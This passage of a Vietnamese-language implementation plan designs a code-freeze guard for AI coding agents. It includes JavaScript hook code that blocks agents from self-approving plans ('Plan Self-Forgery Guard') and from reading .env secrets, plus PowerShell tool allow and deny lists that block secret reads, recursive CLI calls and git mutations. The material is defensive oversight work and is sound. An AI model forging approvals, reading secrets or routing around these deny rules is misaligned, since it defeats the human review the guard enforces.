29. `docs/plans/2026-10-19-vitest-upgrade-and-add-model-skill.md` — (`MAJ-06`) Cập nhật dòng trạng thái ở Header (dòng 4) từ `- **Status**: Approved` sang `- **Status**: Completed` ở bước cuối cùng của quá trình triển khai.

---

### 6. Caller-First Design Sketch

#### 6.1. Thiết Kế Bộ Hàm Kiểm Chứng Phê Duyệt, Thứ Tự Tiền Tố Ngày (`YYYY-MM-DD`), Lọc Ngày Tương Lai (`MIN-04`) & Single Source of Truth (`MAJ-07`, `MAJ-09`) Trong `.agents/scripts/code-freeze-guard.js` (ES Module — `B2`, `M4`, `Minor 8`)

Từ phía caller (`decide(input, options)`, `export function isPlanApproved()`, và bộ test `.agents/scripts/code-freeze-guard.test.ts`), ta xây dựng và export bộ hàm thuần (pure functions) chuẩn ES Module không lặp lại logic (`Minor 8`), loại bỏ hoàn toàn nhánh legacy `.agents/.plan-approved` (`MAJ-07`), giữ nguyên chữ ký `export function isPlanApproved()` và hằng số `REPO_ROOT` (`MAJ-09`), lọc bỏ tiền tố ngày tương lai giả mạo (`MIN-04`), và giải quyết triệt để rủi ro thứ tự `mtimeMs` cũng như đa kế hoạch cùng ngày (`M4`):

```javascript
/**
 * Checks whether the first 30 lines of a plan file contain an explicit
 * `- **Status**: Approved` or `- **Trạng thái**: Approved` header line.
 *
 * @param {string | undefined} content
 * @returns {boolean}
 */
export function hasApprovedPlanHeader(content) {
  if (typeof content !== "string" || !content.trim()) return false;
  const headerLines = content.split(/\r?\n/).slice(0, 30).join("\n");
  return /^(?:-\s*)?\*\*(?:Status|Trạng thái)\*\*:\s*Approved\s*$/im.test(headerLines);
}

/**
 * Checks whether the first 30 lines of a plan file contain an explicit
 * `- **Status**: Completed` or `- **Trạng thái**: Completed` header line.
 *
 * @param {string | undefined} content
 * @returns {boolean}
 */
export function hasCompletedPlanHeader(content) {
  if (typeof content !== "string" || !content.trim()) return false;
  const headerLines = content.split(/\r?\n/).slice(0, 30).join("\n");
  return /^(?:-\s*)?\*\*(?:Status|Trạng thái)\*\*:\s*Completed\s*$/im.test(headerLines);
}

/**
 * Checks whether the last non-blank line of a plan file strictly equals `"[PLAN_APPROVED]"`.
 *
 * @param {string | undefined} content
 * @returns {boolean}
 */
export function hasApprovedPlanFooter(content) {
  if (typeof content !== "string" || !content.trim()) return false;
  const lines = content.split(/\r?\n/);
  for (let i = lines.length - 1; i >= 0; i--) {
    const trimmed = lines[i].trim();
    if (trimmed.length > 0) {
      return trimmed === "[PLAN_APPROVED]";
    }
  }
  return false;
}

/**
 * Evaluates raw markdown content of a single plan file in docs/plans/*.md
 * to determine if it is currently in an active Approved state.
 *
 * @param {string | undefined} content
 * @returns {boolean}
 */
export function evaluatePlanApprovalContent(content) {
  return hasApprovedPlanHeader(content) && hasApprovedPlanFooter(content);
}

/**
 * Single-Step Pre-Approved Plan Guard helper: detects whether a full-file write
 * (`write_to_file` / `write_file`) targeting `docs/plans/*.md` pre-populates
 * `Status: Approved` in the first 30 lines OR `[PLAN_APPROVED]` on the last non-blank line.
 *
 * Legitimate technical plans discussing `[PLAN_APPROVED]` inside the markdown body
 * have `Status: Ready for Review` in the header and do not end with `[PLAN_APPROVED]`,
 * so they are NOT falsely blocked.
 *
 * @param {string | undefined} newContent
 * @returns {boolean}
 */
export function isSelfForgedPlanWrite(newContent) {
  return hasApprovedPlanHeader(newContent) || hasApprovedPlanFooter(newContent);
}

/**
 * Evaluates all plan files in `docs/plans/` deterministically:
 * 1. Extracts the `YYYY-MM-DD` date prefix from `filename` (`/^(\d{4}-\d{2}-\d{2})-/`).
 * 2. Filters out any file without a valid `YYYY-MM-DD` date prefix or whose `datePrefix`
 *    exceeds `maxDatePrefix` (defaults to UTC today + 1 day for timezone safety, preventing
 *    future-dated filenames like `2099-01-01-x.md` from permanently overshadowing active plans — `MIN-04`).
 * 3. Sorts descending by `datePrefix` first (`b.datePrefix.localeCompare(a.datePrefix)`),
 *    using `mtimeMs` descending only as a tie-breaker within the same date prefix
 *    (preventing `git clone`/`checkout` mtime resets from surfacing older dates).
 * 4. Inspects ALL plans sharing the newest valid date prefix (`latestDatePrefix`):
 *    - Fail-safe freeze: If ANY plan in the newest date group is neither `Completed`
 *      nor `Approved` (e.g. a newly created `Ready for Review` or `Changes Requested`
 *      plan on the same day), immediately returns `false`.
 *    - Returns `true` if and only if at least one plan in the newest date group is
 *      `Approved` (`evaluatePlanApprovalContent(plan.content) === true`) and none are pending.
 *
 * @param {Array<{ filename: string, mtimeMs: number, content: string }>} planEntries
 * @param {{ maxDatePrefix?: string }} [options]
 * @returns {boolean}
 */
export function evaluateLatestDateGroupPlans(planEntries, options = {}) {
  if (!Array.isArray(planEntries) || planEntries.length === 0) return false;

  const maxDatePrefix =
    typeof options.maxDatePrefix === "string" && /^\d{4}-\d{2}-\d{2}$/.test(options.maxDatePrefix)
      ? options.maxDatePrefix
      : new Date(Date.now() + 86_400_000).toISOString().slice(0, 10);

  const withPrefix = planEntries
    .map((entry) => {
      const base = path.basename(entry.filename);
      const match = base.match(/^(\d{4}-\d{2}-\d{2})-/);
      return {
        ...entry,
        datePrefix: match ? match[1] : "",
      };
    })
    .filter((item) => item.datePrefix !== "" && item.datePrefix <= maxDatePrefix);

  if (withPrefix.length === 0) return false;

  withPrefix.sort((a, b) => {
    if (a.datePrefix !== b.datePrefix) {
      return b.datePrefix.localeCompare(a.datePrefix);
    }
    return b.mtimeMs - a.mtimeMs;
  });

  const latestDatePrefix = withPrefix[0].datePrefix;
  const latestGroup = withPrefix.filter((item) => item.datePrefix === latestDatePrefix);

  let hasAtLeastOneApproved = false;
  for (const plan of latestGroup) {
    if (evaluatePlanApprovalContent(plan.content)) {
      hasAtLeastOneApproved = true;
    } else if (!hasCompletedPlanHeader(plan.content)) {
      return false;
    }
  }

  return hasAtLeastOneApproved;
}

/**
 * Checks whether an active approved implementation plan exists in `docs/plans/*.md`
 * (Single Source of Truth — legacy `.agents/.plan-approved` check removed per MAJ-07;
 * preserves `export` and `REPO_ROOT` per MAJ-09).
 *
 * @returns {boolean}
 */
export function isPlanApproved() {
  try {
    const plansDir = path.join(REPO_ROOT, "docs", "plans");
    if (!fs.existsSync(plansDir)) return false;

    const planEntries = fs
      .readdirSync(plansDir)
      .filter((f) => f.endsWith(".md") && f.toLowerCase() !== "readme.md")
      .map((f) => {
        const fullPath = path.join(plansDir, f);
        return {
          filename: f,
          mtimeMs: fs.statSync(fullPath).mtimeMs,
          content: fs.readFileSync(fullPath, "utf8"),
        };
      });

    return evaluateLatestDateGroupPlans(planEntries);
  } catch {
    // ignore fs errors -> fail closed
  }
  return false;
}
```

#### 6.2. Call Site Tại `decide()`, Gate 3 (`.md`-Only Trên Toàn Bộ `UNFROZEN_PREFIXES` `docs/**` & `UNFROZEN_FILES`), `MUTATING_FLAGS`, `extractInput`, `formatHookOutput` & `main()` Trong `.agents/scripts/code-freeze-guard.js` (`BLK-03`, `BLK-04`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-07`, `B1`, `B2`, `Minor 7`)

```javascript
// Trong READ_ONLY_COMMANDS (.agents/scripts/code-freeze-guard.js:62-66):
  /^git (?:status|diff|log|show|blame)(?: \S+)*$/,
  /^powershell(?:\.exe)?\s+(?:-(?:NoProfile|ExecutionPolicy\s+(?:Bypass|RemoteSigned|Unrestricted))\s+)*-File\s+["']?\.agents[/\\]scripts[/\\]run-claude\.ps1["']?(?:\s+(?:-CheckOnly|-(?:Role|Mode)\s+(?:planner|reviewer|plan|review)|-PlanFile\s+["']?docs[/\\]plans[/\\][A-Za-z0-9._-]+\.md["']?|-Model\s+[A-Za-z0-9._-]+|-(?:Task|Prompt)\s+(?:"[^"]*"|'[^']*'|\S+)|-ArtifactFile\s+["']?(?!.*\.\.)[^\s"']*[/\\]\.gemini[/\\]antigravity[/\\]brain[/\\][^\s"']+\.md["']?))*\s*$/i,
  /^claude(?:\.exe)?\s+(?:--version|-v|--help|-h|-p\s+["']?ping["']?)$/i,
  /^node\s+["']?(?:\.[\/\\])?scripts[\/\\]verify-docs\.mjs["']?(?:\s+(?:--strict-shorthand|--expected-headings=\d+))*$/,

// Trong MUTATING_FLAGS (.agents/scripts/code-freeze-guard.js:71 — BLK-03, MIN-07):
// Các cờ ngắn -c, -u, -i bắt buộc có ranh giới khoảng trắng (?:^|\s) phía trước để không chặn nhầm
// đường dẫn test chứa dấu gạch ngang (ví dụ: npx vitest run src/lib/features/chat/batch-c.test.ts).
const MUTATING_FLAGS =
  /(?:^|\s)(?:--fix|--write|--force|--output|--outputFile|--config|--root|--dir|--globalSetup|--setupFiles|--extcmd|--update|--coverage)(?:\s|=|$)|(?:^|\s)-(?:c|u|i)(?:\s|=|$)/;

// Tại đầu nhánh if (input.targetFile) trong decide(input, options = {}) (MAJ-08):
  if (input.targetFile) {
    // 0. Read Guard for .env* secrets (when invoked as PreToolUse hook for Read/read_file/view_file)
    if (
      input.toolName === "Read" ||
      input.toolName === "read_file" ||
      input.toolName === "view_file"
    ) {
      const baseName = path.basename(toPosix(input.targetFile));
      const relCandidate = toRepoRelative(input.targetFile);
      if (
        /^\.env(?:\..+)?$/i.test(baseName) ||
        (relCandidate !== null &&
          (relCandidate.startsWith(".env") || relCandidate.includes("/.env")))
      ) {
        return ask(
          `\u26a0\ufe0f Code Freeze Guard: reading .env* secret files is prohibited (${input.targetFile}).`
        );
      }
      return { decision: "allow" };
    }

    // ... Gate 1 & Gate 2 ...

    // 3. Unfrozen paths (docs/ and root planning artifacts)
    const unfrozen =
      UNFROZEN_PREFIXES.some((prefix) => relative.startsWith(prefix)) ||
      UNFROZEN_FILES.includes(relative);
    if (unfrozen) {
      // Layer 2 (BLK-03, BLK-04): Only .md files are allowed inside ALL unfrozen documentation
      // paths (docs/** and root planning artifacts), preventing creation of executable
      // docs/notes/x.test.mjs, docs/plans/x.test.mjs, or *.js/*.ts anywhere under docs/**.
      if (!relative.toLowerCase().endsWith(".md")) {
        return ask(
          `\u26a0\ufe0f Code Freeze Guard: only .md files are allowed inside unfrozen documentation paths (${relative}).`
        );
      }

      // Single-Step Pre-Approved Plan Guard: block full-file creation/overwrite
      // (write_to_file / write_file / Write) on docs/plans/ if it pre-populates
      // Status: Approved in the header or [PLAN_APPROVED] on the last non-blank line.
      if (
        (relative === "docs/plans" || relative.startsWith("docs/plans/")) &&
        (input.toolName === "write_to_file" ||
          input.toolName === "write_file" ||
          input.toolName === "Write") &&
        isSelfForgedPlanWrite(input.newContent)
      ) {
        return ask(
          `\u26a0\ufe0f Plan Self-Forgery Guard (Single-Step Pre-Approved Plan Guard): Không được phép dùng ${input.toolName} để tạo mới hoặc ghi đè file kế hoạch (${relative}) đã gắn sẵn 'Status: Approved' hoặc thẻ '[PLAN_APPROVED]' ở dòng cuối. Kế hoạch mới phải có 'Status: Ready for Review' và chỉ được phê duyệt qua replace_file_content/edit_file bởi Lead Reviewer.`
        );
      }
      return { decision: "allow" };
    }
  }

// Bổ sung hàm formatHookOutput(result, rawPayload) & tích hợp vào main() (BLK-03, BLK-04, MAJ-10, MAJ-12):
/**
 * Formats the guard decision for either Google Antigravity hooks (`{ decision, reason }`)
 * or Claude Code CLI `PreToolUse` hooks (`{ hookSpecificOutput }` or `null` on allow).
 *
 * Per Claude Code Hooks & Permissions docs:
 * 1. Top-level `decision` is invalid for `PreToolUse` schema validation (`MAJ-10`), so when
 *    `root.hook_event_name === "PreToolUse"` we NEVER include `decision` at the top level.
 * 2. Returning `permissionDecision: "allow"` from a `PreToolUse` hook skips `--allowedTools` and
 *    `dontAsk` auto-deny (`BLK-04`), whereas `permissionDecision: "defer"` in `-p` non-interactive
 *    mode is designed for `claude -p --resume` and risks exiting with code `2` (`MAJ-12`).
 *    Conversely, exiting `0` with NO stdout output is documented across Claude Code docs as letting
 *    the tool call proceed through normal permission evaluation (`--allowedTools` +
 *    `--disallowedTools` + `dontAsk`). Therefore, when `result.decision === "allow"` for
 *    `PreToolUse`, `formatHookOutput` returns `null` so `main()` writes nothing to stdout and exits `0`.
 *
 * @param {GuardDecision} result
 * @param {unknown} rawPayload
 * @returns {Record<string, unknown> | null}
 */
export function formatHookOutput(result, rawPayload) {
  const root = /** @type {Record<string, any>} */ (rawPayload ?? {});
  if (root.hook_event_name === "PreToolUse") {
    if (result.decision === "allow") {
      return null;
    }
    const permissionDecision =
      root.permission_mode === "dontAsk" ? "deny" : "ask";
    return {
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision,
        ...(result.reason ? { permissionDecisionReason: result.reason } : {}),
      },
    };
  }
  return result;
}

/** Reads the payload from stdin and writes the formatted decision to stdout. */
function main() {
  let raw = "";
  process.stdin.setEncoding("utf8");
  process.stdin.on("data", (chunk) => {
    raw += chunk;
  });
  process.stdin.on("end", () => {
    /** @type {GuardDecision} */
    let result;
    /** @type {unknown} */
    let parsedPayload;
    try {
      parsedPayload = JSON.parse(raw);
      result = decide(extractInput(parsedPayload));
    } catch {
      // Fail CLOSED: an unreadable payload must never silently unfreeze the repo.
      result = {
        decision: "ask",
        reason:
          "\u26a0\ufe0f Code Freeze Guard: payload could not be parsed \u2014 failing closed.",
      };
    }
    const output = formatHookOutput(result, parsedPayload);
    if (output !== null) {
      process.stdout.write(JSON.stringify(output));
    }
  });
}
```

#### 6.3. Thiết Kế 4 Lớp Phòng Thủ (`BLK-02`..`BLK-04`, `MAJ-04`, `MAJ-05`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-06`) & Kiểm Tra `-ArtifactFile` (`MIN-05`) Trong `.agents/scripts/run-claude.ps1` (`B1`)

Theo tài liệu chính thức của Claude Code CLI (`https://code.claude.com/docs/en/permissions`, `https://code.claude.com/docs/en/hooks` — `BLK-03`, `BLK-04`, `MAJ-04`, `MAJ-08`, `MAJ-10`, `MAJ-12`, `MIN-06`):

1. **Lớp 1 (`PreToolUse` Hook qua `--settings` với `"onFailure": "block"` & `allow` ➔ `null` / no stdout + exit `0` — `BLK-03`, `BLK-04`, `MAJ-10`, `MAJ-12`)**: Truyền `--settings $claudeHookSettings` (có `"onFailure":"block"`) vào `claude -p` để mọi thao tác `Write|Edit|MultiEdit|Bash|Read` của Claude CLI đều đi qua `node .agents/scripts/code-freeze-guard.js`. Nhờ `formatHookOutput` trả `null` (không ghi stdout, thoát mã `0` để đi tiếp qua `--allowedTools` + `--disallowedTools` + `dontAsk` mà không gây exit `2` trong `-p` mode — `MAJ-12`) khi `decide()` cho phép, và trả `"deny"` khi `decide()` chặn (không có trường `decision` cấp gốc — `MAJ-10`), quyền thực tế là phép giao (`intersection`) giữa `--allowedTools` và `decide()`.
2. **Lớp 2 (`Edit(docs/plans/*.md)` + `.md`-Only trên toàn bộ `docs/**`+ tool-level deny`Write`cho`reviewer`—`BLK-03`, `BLK-04`, `MAJ-04`)**: Thu hẹp `Edit(docs/plans/**)`thành`Edit(docs/plans/\*.md)`, chặn mọi file không phải `.md`trong toàn bộ`docs/**`tại Gate 3 của`code-freeze-guard.js`, và giữ `Write`trần trong`--disallowedTools`của`reviewer`.
3. **Lớp 3 (Dấu cách trước `*` trong `$sharedAllowedBash` — `BLK-03`, `MAJ-05`)**: Mọi rule tiền tố có tham số đều có dấu cách trước `*` (`Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(git status *)`, `Bash(git blame *)`, `Bash(npm ls *)`, `Bash(node scripts/verify-docs.mjs *)`, `Bash(npm run test:run *)`), ngăn `Bash(git diff *)` khớp với `git difftool`.
4. **Lớp 4 (Chặn đọc `.env*` secrets, chặn lệnh gọi đệ quy CLI & chặn cờ nạp code/config/output — `BLK-02`, `BLK-03`, `MAJ-08`, `MIN-06`)**: Bổ sung `Read(.env*),Read(**/.env*)`, `Bash(powershell *),Bash(pwsh *),Bash(claude *)` (`MIN-06`), cùng `Bash(git difftool*),Bash(* --config*),Bash(* -c *),Bash(* --root*),Bash(* --dir*),Bash(* --globalSetup*),Bash(* --setupFiles*),Bash(* --extcmd*)` vào `$sharedDisallowed`.
5. **Kiểm tra `IsPathRooted` & dùng `$resolvedArtifactFile` (`MIN-05`)**: Bắt buộc `-ArtifactFile` là đường dẫn tuyệt đối (`IsPathRooted`, nếu sai báo lỗi và `exit 43`) và dùng `$resolvedArtifactFile` tại `Split-Path`/`New-Item`/`Copy-Item`.

```powershell
# 4b. Kiểm tra bảo mật tham số ArtifactFile (nếu có truyền — B1, MIN-05):
# Bắt buộc phải là đường dẫn tuyệt đối (IsPathRooted), nằm trong ~/.gemini/antigravity/brain/ và có đuôi .md.
$resolvedArtifactFile = ""
if (-not [string]::IsNullOrWhiteSpace($ArtifactFile)) {
    $trimmedArtifact = $ArtifactFile.Trim()
    if (-not [System.IO.Path]::IsPathRooted($trimmedArtifact)) {
        Write-Error "[INVALID_ARTIFACT_PATH] ArtifactFile bắt buộc phải là đường dẫn tuyệt đối (IsPathRooted): '$ArtifactFile'."
        exit 43
    }
    $brainRoot = [System.IO.Path]::GetFullPath((Join-Path $env:USERPROFILE ".gemini\antigravity\brain"))
    if (-not $brainRoot.EndsWith([System.IO.Path]::DirectorySeparatorChar)) {
        $brainRoot += [System.IO.Path]::DirectorySeparatorChar
    }
    try {
        $candidateArtifact = [System.IO.Path]::GetFullPath($trimmedArtifact)
    } catch {
        Write-Error "[INVALID_ARTIFACT_PATH] Đường dẫn ArtifactFile không hợp lệ: '$ArtifactFile'."
        exit 43
    }
    if (
        $trimmedArtifact.Contains("..") -or
        (-not $candidateArtifact.StartsWith($brainRoot, [System.StringComparison]::OrdinalIgnoreCase)) -or
        ([System.IO.Path]::GetExtension($candidateArtifact) -inotmatch '^\.md$')
    ) {
        Write-Error "[INVALID_ARTIFACT_PATH] ArtifactFile ('$ArtifactFile') bắt buộc phải nằm trong '$brainRoot' và có phần mở rộng '.md'."
        exit 43
    }
    $resolvedArtifactFile = $candidateArtifact
}

# 5. Phân quyền công cụ tối thiểu 4 lớp theo Role (KHÔNG dùng --dangerously-skip-permissions):
# Lớp 3: Đồng bộ danh sách Bash read-only với Nhóm A-D của allowlist.md, bắt buộc có dấu cách trước '*' (BLK-03, MAJ-05)
$sharedAllowedBash = "Bash(npm run type-check),Bash(npm run lint),Bash(npm run test:run),Bash(npm run test:run *),Bash(npm run verify),Bash(npx tsc --noEmit),Bash(npx tsc --showConfig),Bash(npx eslint --print-config *),Bash(npx vitest run *),Bash(npx vitest list --filesOnly),Bash(node scripts/verify-docs.mjs),Bash(node scripts/verify-docs.mjs *),Bash(npm ls),Bash(npm ls *),Bash(npm view *),Bash(git status),Bash(git status *),Bash(git log *),Bash(git diff *),Bash(git show *),Bash(git blame *)"

# Lớp 4: Chặn đọc secrets .env* (MAJ-08), chặn Edit đệ quy trên mã nguồn/hạ tầng (MAJ-04),
# chặn gọi đệ quy powershell/pwsh/claude (MIN-06), chặn git difftool & các cờ nạp code/config (BLK-03),
# chặn cờ ghi file (BLK-02), và chặn git mutating
$sharedDisallowed = "Read(.env*),Read(**/.env*),Edit(src/**),Edit(.agents/**),Edit(scripts/**),Edit(supabase/**),Edit(tests/**),Bash(powershell *),Bash(pwsh *),Bash(claude *),Bash(git difftool*),Bash(* --config*),Bash(* -c *),Bash(* --root*),Bash(* --dir*),Bash(* --globalSetup*),Bash(* --setupFiles*),Bash(* --extcmd*),Bash(git * --output*),Bash(* --output=*),Bash(* --output *),Bash(* --outputFile*),Bash(* --fix*),Bash(* --write*),Bash(* -u),Bash(* -u *),Bash(* --update*),Bash(* --coverage*),Bash(git add*),Bash(git commit*),Bash(git push*),Bash(git checkout*),Bash(git switch*),Bash(git reset*),Bash(git branch*),Bash(git stash*),Bash(git merge*),Bash(git rebase*)"

if ($normalizedRole -eq "planner") {
    # ... nạp prompt template ...
    # Lớp 2: Chỉ cho phép tạo/sửa file .md trong docs/plans/ (BLK-03, BLK-04)
    $allowedTools = "Read,Glob,Grep,LS,WebSearch,WebFetch,Edit(docs/plans/*.md),$sharedAllowedBash"
    $disallowedTools = $sharedDisallowed
} else {
    # ... nạp prompt template ...
    # Lớp 2: Reviewer bị thu hồi công cụ Write ở cấp độ tool (bare 'Write' trong --disallowedTools)
    # và chỉ được phép Edit(docs/plans/*.md) trên file kế hoạch đã tồn tại (BLK-03, BLK-04, MAJ-04)
    $allowedTools = "Read,Glob,Grep,LS,WebSearch,WebFetch,Edit(docs/plans/*.md),$sharedAllowedBash"
    $disallowedTools = "Write,$sharedDisallowed"
}

# Lớp 1: Gắn trực tiếp code-freeze-guard.js làm PreToolUse hook với "onFailure":"block" (BLK-03, BLK-04, MAJ-10, MAJ-12)
$claudeHookSettings = '{"hooks":{"PreToolUse":[{"matcher":"Write|Edit|MultiEdit|Bash|Read","hooks":[{"type":"command","command":"node .agents/scripts/code-freeze-guard.js","onFailure":"block"}]}]}}'

# 6. Chuẩn bị cờ thực thi với --permission-mode dontAsk và --settings
$cliArgs = @(
    "-p", $prompt,
    "--permission-mode", "dontAsk",
    "--settings", $claudeHookSettings,
    "--allowedTools", $allowedTools,
    "--disallowedTools", $disallowedTools
)
if ($Model) {
    $cliArgs += @("--model", $Model)
}

# ...
# 9. Sync to ArtifactFile when specified (sử dụng $resolvedArtifactFile đã chuẩn hóa — MIN-05)
if (($claudeExitCode -eq 0) -and (-not [string]::IsNullOrWhiteSpace($resolvedArtifactFile)) -and (Test-Path -LiteralPath $relPlanFile)) {
    try {
        $artifactDir = Split-Path -Parent $resolvedArtifactFile
        if ($artifactDir -and -not (Test-Path -LiteralPath $artifactDir)) {
            New-Item -ItemType Directory -Path $artifactDir -Force | Out-Null
        }
        Copy-Item -LiteralPath $relPlanFile -Destination $resolvedArtifactFile -Force
        Write-Host "[ARTIFACT_SYNCED] Synced $relPlanFile to $resolvedArtifactFile"
    } catch {
        Write-Warning "[ARTIFACT_SYNC_WARNING] Failed to sync ArtifactFile: $($_.Exception.Message)"
    }
}
```

#### 6.4. Ma Trận Bảo Toàn Quy Chuẩn Khi Tinh Giản `.agents/rules/02-quality.md` & `.agents/rules/05-plan-review.md` (`M5`)

Để đảm bảo việc thu gọn dung lượng ký tự của 2 file `always_on` (`02-quality.md` từ `11,044 chars` xuống `~6,500 chars` và `05-plan-review.md` từ `10,749 chars` xuống `~6,500 chars`) **tuyệt đối không làm rơi rớt bất kỳ quy chuẩn bắt buộc nào**, quá trình chỉnh sửa ở Bước 3 và kiểm thử ở `TC-08` bắt buộc đối chiếu 1-1 theo ma trận sau:

| File Rule (`always_on`)               | Mục Quy Chuẩn Bắt Buộc Hiện Hữu (`[SRC]`)                                             | Quy Tắc Bất Biến Bắt Buộc Bảo Toàn 100% Sau Khi Tinh Giản                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| :------------------------------------ | :------------------------------------------------------------------------------------ | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`.agents/rules/02-quality.md`**     | **1. Pre-Work Protocol Table** (`dòng 8–37`)                                          | Giữ nguyên bảng ánh xạ 18 hàng Domain ➔ Read first / Workflow to follow (cập nhật dòng 19 sang `.agents/skills/vikini-debug/SKILL.md` và dòng 30 sang `.agents/skills/vikini-audit/SKILL.md`) cùng khối `<important>` cưỡng chế đọc trước khi viết code.                                                                                                                                                                                                                                                                |
| **`.agents/rules/02-quality.md`**     | **2. Skill Precedence Hierarchy** (`dòng 39–46`)                                      | Giữ nguyên thứ tự ưu tiên Tầng 1 (Vikini Internal Governance & Skills: `.agents/rules/`, `.agents/skills/*/SKILL.md`, chuỗi Planner → Reviewer → `@qa`) thắng tuyệt đối Tầng 2 (Superpowers plugin), và cấm Superpowers ghi đè luật cấm git hay quy trình duyệt plan.                                                                                                                                                                                                                                                   |
| **`.agents/rules/02-quality.md`**     | **3. Post-Change Checklist Tiers 1–3** (`dòng 48–67`)                                 | Giữ nguyên bảng 3 tầng kiểm chứng: Tier 1 (`npm run type-check` sau mỗi lần sửa), Tier 2 (`npm run verify` sau khi xong task — cấm bỏ qua), Tier 3 (CI pipeline), kèm nghĩa vụ cập nhật `docs/CHANGELOG.md` và tài liệu liên quan.                                                                                                                                                                                                                                                                                      |
| **`.agents/rules/02-quality.md`**     | **4. Windows PowerShell 5.1 Terminal Guidance** (`dòng 68–76`)                        | Giữ nguyên quy tắc cấm dùng `&&` khi gõ lệnh trực tiếp trên PowerShell 5.1 và bắt buộc dùng `;` (`npm run type-check; npm run lint; npm run test:run`).                                                                                                                                                                                                                                                                                                                                                                 |
| **`.agents/rules/02-quality.md`**     | **5. Test Failure Triage Protocol (Loại A/B/C)** (`dòng 78–95`)                       | Giữ nguyên phân loại Loại A (Code Bug ➔ sửa code, cấm sửa test), Loại B (Test Harness ➔ sửa mock/import, cấm giảm `expect()`), Loại C (Approved Spec Change ➔ cập nhật theo Test Contract đã có `[PLAN_APPROVED]`) và khối cấm xóa `expect()`, nới lỏng matcher, hoặc thêm `.skip`/`.only`.                                                                                                                                                                                                                             |
| **`.agents/rules/02-quality.md`**     | **6. Phân Định Ranh Giới Audit vs `@qa` & Tài Sản Kỹ Thuật** (`dòng 97–109`)          | Giữ nguyên phân biệt giữa skill `.agents/skills/vikini-audit/SKILL.md` (audit định kỳ) với `@qa` (nghiệm thu On-Demand khi user gọi `@qa`), và 3 tham chiếu `streaming-patterns`, `database-migration`, `api-patterns` (`await auth()` + `UnauthorizedError` hoặc `requireUser()`).                                                                                                                                                                                                                                     |
| **`.agents/rules/02-quality.md`**     | **7. Governance Character Limits** (`dòng 111–120`)                                   | Giữ nguyên giới hạn cứng: `.agents/rules/*.md <= 12,000` ký tự và `.agents/agents/*/agent.md <= 10,000` ký tự.                                                                                                                                                                                                                                                                                                                                                                                                          |
| **`.agents/rules/02-quality.md`**     | **8. Post-Fix, Debugging, Bilingual & Minimal Diffs** (`dòng 121–160`)                | Giữ đủ các bước bất biến sau khi sửa bug (`npm run verify`, ghi `docs/lessons-learned.md` kèm qui tắc thăng cấp khi lặp 3+ lần, cập nhật `docs/CHANGELOG.md`), quy trình Debugging 6 bước (bao gồm 3-strike Circuit Breaker: `"ARCHITECTURAL ALERT: 3 fixes failed..."`), Bilingual & Minimal Diffs, trỏ chi tiết sang `.agents/skills/vikini-debug/SKILL.md`.                                                                                                                                                          |
| **`.agents/rules/05-plan-review.md`** | **1. Code Freeze & Scoped Protection (§1)** (`dòng 8–23`)                             | Giữ nguyên nguyên tắc cấm sửa source code khi chưa có `[PLAN_APPROVED]`, ngoại lệ bề mặt `docs/plans/*.md` & `~/.gemini/antigravity/brain/`, và đủ 5 danh mục file nhạy cảm luôn bị hỏi `ask` (`*.server.ts`, migrations `*.sql`, `TEST_INFRA_FILES`, test files, `.agents/**`).                                                                                                                                                                                                                                        |
| **`.agents/rules/05-plan-review.md`** | **2. Fast-Track Mode (§1.1)** (`dòng 24–39`)                                          | Giữ nguyên đủ 4 điều kiện kỹ thuật (a) `replace_file_content` / `edit_file`, (b) đường dẫn UI/translation/styles hợp lệ (trừ `api/`, `*.test.tsx`, `*.spec.tsx`, `*.server.tsx`), (c) `<= 40` dòng mỗi bên, (d) không chứa `"use server"`, `process.env`, `*.server`; cùng đủ 4 nghĩa vụ của Agent (đọc `SKILL.md`, ghi `📌 [Fast-Track \| Skills: ...]`, chạy `npm run type-check`, cấm chia nhỏ tính năng lớn).                                                                                                       |
| **`.agents/rules/05-plan-review.md`** | **3. Zero-Self-Execution & Dual-Planner (§2)** (`dòng 40–52`)                         | Giữ nguyên lệnh cấm Orchestrator tự viết plan hay tự cấp `[PLAN_APPROVED]`, kiến trúc 2 kênh Primary Planner (`run-claude.ps1 -Role planner`) và Fallback Planner (`@planner` khi `exit 40/41/42`).                                                                                                                                                                                                                                                                                                                     |
| **`.agents/rules/05-plan-review.md`** | **4. Dual-Reviewer & Uninterrupted Chain (§3)** (`dòng 53–69`)                        | Giữ nguyên kiến trúc Primary Reviewer (`@reviewer`, chỉ dùng `replace_file_content`/`edit_file` trong Audit-Only Write Scope) và Fallback Reviewer (`run-claude.ps1 -Role reviewer`, gắn `PreToolUse` hook `code-freeze-guard.js` với `"onFailure": "block"`, chỉ có quyền `Edit(docs/plans/*.md)` và bị chặn `Write` ở cấp độ tool), chuỗi tự động không ngắt quãng và giới hạn tối đa **10 vòng lặp revision** trước khi bật Circuit Breaker.                                                                         |
| **`.agents/rules/05-plan-review.md`** | **5. Severity Rubric (§4)** (`dòng 70–83`)                                            | Giữ nguyên tham chiếu 3 tài liệu vệ tinh (`allowlist.md`, `evidence-bar.md`, `mental-simulation.md` S1–S6) và định nghĩa 3 mức `[BLOCKER]`, `[MAJOR]`, `[MINOR]`.                                                                                                                                                                                                                                                                                                                                                       |
| **`.agents/rules/05-plan-review.md`** | **6. Cấu Trúc Plan, Sắp Xếp Ngày & Vòng Đời `Status: Completed` (§5)** (`dòng 84–95`) | Giữ nguyên cấu trúc 2 phần (`## Technical Plan` & `## Audit History`), Single Source of Truth duy nhất tại `docs/plans/*.md` (`MAJ-07`), điều kiện mở khóa kép (`- **Status**: Approved` ở 30 dòng đầu + `[PLAN_APPROVED]` ở dòng không rỗng cuối cùng), quy tắc sắp xếp theo tiền tố ngày `YYYY-MM-DD` (lọc bỏ ngày tương lai `> UTC today + 1 day` — `MIN-04`) + fail-safe khi có plan chờ duyệt cùng ngày, Single-Step Pre-Approved Plan Guard, và nghĩa vụ chuyển sang `- **Status**: Completed` khi hoàn tất task. |
